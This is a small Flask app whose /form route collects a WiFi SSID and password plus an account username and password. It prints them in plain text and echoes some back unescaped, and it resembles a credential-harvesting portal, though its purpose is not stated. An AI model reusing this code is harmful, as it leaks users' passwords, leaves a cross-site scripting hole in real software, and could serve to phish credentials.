import logging
from flask import Flask, request, render_template

app = Flask(__name__)
app.logger.setLevel(logging.ERROR)  # Disable Flask's default log level

@app.route('/form', methods=['GET', 'POST'])
def form():
    if request.method == 'POST':
        ssid = request.form['ssid']
        wifi_password = request.form['wifi-password']
        username = request.form['username']
        account_password = request.form['account-password']
        
        print(f"Submitted SSID: {ssid}")
        print(f"Submitted Password: {wifi_password}")

        print(f"Submitted Username: {username}")
        print(f"Submitted Password: {account_password}")

        return f'Thank you for submitting the form! Data: {ssid}, {wifi_password}'
    else:
        return render_template('index.html')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
